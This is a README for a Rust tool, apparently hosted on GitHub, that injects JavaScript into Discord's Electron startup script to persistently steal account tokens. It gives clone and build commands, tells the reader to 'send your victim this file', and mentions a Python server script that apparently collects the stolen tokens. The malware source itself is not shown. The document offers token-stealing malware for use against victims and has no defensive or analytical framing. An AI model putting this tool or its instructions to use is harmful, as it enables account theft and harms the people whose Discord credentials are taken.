# Discord Inject

## A discord injection written in Rust for Unix.

*The concept is simple, a program that injects JS code into Discord's startup electron script to persistently steal tokens*

# Usage (Client side)

```
git clone https://github.com/vinniedaboi/discordinject/
```
```
cargo build --release
```
```
cd target/debug/release
```

### Send your victim this file

```
./discordinject
```

# Usage (Server Side)

```python3 server.py```

# DISCLAIMER: FOR DIFFERENT VERSIONS OF DISCORD YOU NEED TO FIGURE OUT THE VERSION OF DISCORD AND MODIFY THE PATH
